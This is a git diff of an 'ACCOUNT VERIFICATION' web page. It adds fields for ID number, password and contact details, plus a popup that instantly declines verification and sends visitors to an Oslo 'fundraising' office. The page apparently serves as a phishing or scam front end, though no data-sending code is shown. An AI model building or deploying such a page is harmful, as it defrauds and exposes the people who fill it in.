@@ -5,13 +5,27 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ACCOUNT VERIFICATION </title>
+    <script src="js/jquery.js"></script>
     <link rel="stylesheet" href="veri.css">
+
+
+    <script>
+        $(document).ready(function() {
+            $("#popN").show();
+            $(".container").hide();
+        },3000);
+    </script>
+
+
+
 </head>
 <body>
-<<<<<<< HEAD
-=======
-    
->>>>>>> 33739b4fbd9bf509712a6812bd41053413c8d604
+    <div id="popN">
+        <h1> VERIFICATION DECLINED! </h1>
+        <h2>Sorry you can't verify this account here, visit Nordix office at Internatinal Committee on Fundraising Organization (ICFO).
+         <br>Radhusgata 25, <br>0158 Oslo, Norway
+        </h2><br>
+    </div>
     <div class="container">
         <div class="title">
             <h4>ACCOUNT VERIFICATION</h4>
@@ -20,52 +34,38 @@
             <div class="user-details"> 
                 <div class="input-box"> 
                     <span class="details">First Name</span>
-<<<<<<< HEAD
-                    <input type="text" placeholder="Enter your firstname" required>
+                    <input type="text" placeholder="Firstname" required>
                 </div>
                 <div class="input-box"> 
                     <span class="details">Last Name</span>
-                    <input type="text" placeholder="Enter your lastname" required>
+                    <input type="text" placeholder="Lastname" required>
                 </div>
+                <div class="input-box"> 
+                    <span class="details">State Residence</span>
+                    <input type="text" placeholder="State Residence" required>
+                </div>
+                <div class="input-box"> 
+                    <span class="details">ID Number</span>
+                    <input type="text" placeholder="ID Number" required>
+                </div>
+
                 <div class="input-box"> 
                     <span class="details">Email</span>
-                    <input type="text" placeholder="Enter your email" required>
+                    <input type="text" placeholder="Email Address" required>
                 </div>
                 <div class="input-box"> 
-                    <span class="details">Password</span>
-                    <input type="text" placeholder="Enter your password" required>
+                    <span class="details">Phone</span>
+                    <input type="text" placeholder="Phone" required>
                 </div>
+
                 <div class="input-box"> 
-                    <span class="details">Phone Number</span>
-                    <input type="text" placeholder="Enter your number" required>
-=======
-                    <input id="fstNm" type="text" placeholder="Enter your firstname" required>
-                </div>
-                <div class="input-box"> 
-                    <span class="details">Last Name</span>
-                    <input id="fstNm" type="text" placeholder="Enter your lastname" required>
-                </div>
-                <div class="input-box"> 
-                    <span class="details">Email</span>
-                    <input id="mail" type="text" placeholder="Enter your email" required>
-                </div>
-                <div class="input-box"> 
-                    <span class="details">Password</span>
-                    <input id="pwd" type="text" placeholder="Enter your password" required>
-                </div>
-                <div class="input-box"> 
-                    <span class="details">Phone Number</span>
-                    <input id="phone" type="text" placeholder="Enter your number" required>
->>>>>>> 33739b4fbd9bf509712a6812bd41053413c8d604
+                    <span class="details">Postal Code</span>
+                    <input type="text" placeholder="Postal Code" required>
                 </div>
                 
                 <div class="input-box"> 
-                    <span class="details">Confirm Password</span>
-<<<<<<< HEAD
-                    <input type="text" placeholder="Confirm password" required>
-=======
-                    <input id="cnpwd" type="text" placeholder="Confirm password" required>
->>>>>>> 33739b4fbd9bf509712a6812bd41053413c8d604
+                    <span class="details">Password</span>
+                    <input type="text" placeholder="Confirm Password" required>
                 </div>
             </div>
             <div class="gender-details">
@@ -87,39 +87,10 @@
                         <span class="gender">Others</span>
                     </label>
                 </div>
-<<<<<<< HEAD
             </div>
             <div class="button">
                 <input id="regist" type="submit" value="VERIFY">
             </div>
         </form>
-=======
-            </div>
-            <div class="button">
-                <button id="regist" onclick="verIn()">VERIFY</button>
-            </div>
-
-            <p id="infs"></p>
-        </form>
-        <script>
-           
-           var infs = document.getElementById("infs");
-           const fstNm = document.querySelector("#fstNm");
-           const mail = document.querySelector("#mail");
-           const phone = document.querySelector("#phone");
-           const pwd = document.querySelector("#pwd");
-           const cnpwd = document.querySelector("#cnpwd");
-
-            function verIn(){
-           
-                if (fstNm.value === "" || mail.value === "" || phone.value === "" || pwd.value ==="" || cnpwd.value ===""){
-                    infs.innerHTML = "Fill in all the requred inputs"
-                }
-                    else{
-                window.location.href="valid.html"
-            };
-        };
-    </script>
->>>>>>> 33739b4fbd9bf509712a6812bd41053413c8d604
 </body>
 </html>
